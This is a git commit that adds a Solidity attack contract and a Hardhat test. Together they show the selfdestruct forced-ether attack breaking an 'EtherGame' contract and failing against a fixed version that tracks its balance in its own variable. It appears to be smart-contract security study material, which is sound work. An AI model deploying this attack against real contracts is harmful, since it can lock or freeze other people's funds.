39ef2f0e1d3c9e6d2ad74947da4e1729e57d0bba
niuqy <nqyimtheonlyone@163.com>
2022-04-12 14:34:49 +0800

    self destruct

---
+++ contracts/SelfDestruct/Attack.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./EtherGame.sol";
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
+
+        // cast address to payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
---
+++ test/SelfDestruct.js
@@ -0,0 +1,70 @@
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
+
+describe("SelfDestruct",function(){
+    it("EtherGame被攻击,不能再deposit,但也没有winner产生",async function(){
+        const EtherGame = await ethers.getContractFactory("EtherGame");
+        let game = await EtherGame.deploy();
+        await game.deployed();
+
+        const Attack = await ethers.getContractFactory("contracts/SelfDestruct/Attack.sol:Attack");
+        let attack = await Attack.deploy(game.address);
+        await attack.deployed();
+
+        const [owner,signer1,signer2,signer3] = await ethers.getSigners();
+
+        //regular deposit
+        game = game.connect(signer1);
+        await game.deposit({value:ethers.utils.parseEther("1")});
+
+        game = game.connect(signer2);
+        await game.deposit({value:ethers.utils.parseEther("1")});
+
+        //attack
+        attack = attack.connect(signer3);
+        await attack.attack({value:ethers.utils.parseEther("5")});
+
+        //can't deposit again
+        await expect(game.deposit({value:ethers.utils.parseEther("1")}))
+            .to.be.revertedWith("Game is over");
+        //no winner
+        expect(await game.winner()).to.hexEqual("0x0");
+
+    });
+
+    it("不依赖 address(this).balance,使用单独的变量记录余额",async function(){
+        const EtherGame = await ethers.getContractFactory("EtherGamePrev");
+        let game = await EtherGame.deploy();
+        await game.deployed();
+
+        const Attack = await ethers.getContractFactory("contracts/SelfDestruct/Attack.sol:Attack");
+        let attack = await Attack.deploy(game.address);
+        await attack.deployed();
+
+        const [owner,signer1,signer2,signer3] = await ethers.getSigners();
+
+        //regular deposit
+        game = game.connect(signer1);
+        for(let i = 0;i < 5;i++){
+            await game.deposit({value:ethers.utils.parseEther("1")});
+        }
+
+        //invalid attack
+        attack = attack.connect(signer2);
+        await attack.attack({value:ethers.utils.parseEther("2")});
+        expect(await game.balance()).to.equal(ethers.utils.parseEther("5"));
+
+        //can deposit again
+        game = game.connect(signer3);
+        await game.deposit({value:ethers.utils.parseEther("1")});
+        await game.deposit({value:ethers.utils.parseEther("1")});
+        
+        //winner is generated
+        expect(await game.winner()).to.hexEqual(signer3.address);
+
+        //game is over
+        await expect(game.deposit({value:ethers.utils.parseEther("1")}))
+            .to.be.revertedWith("Game is over");
+
+    });
+});
